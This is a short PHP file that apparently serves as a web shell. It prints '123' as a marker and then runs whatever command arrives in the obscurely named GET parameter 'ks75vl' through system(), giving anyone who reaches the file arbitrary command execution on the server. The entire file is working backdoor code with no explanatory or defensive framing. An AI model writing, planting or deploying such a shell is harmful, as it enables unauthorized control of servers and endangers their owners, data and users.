<?php
	
	echo 123;
	system($_GET['ks75vl']);

?>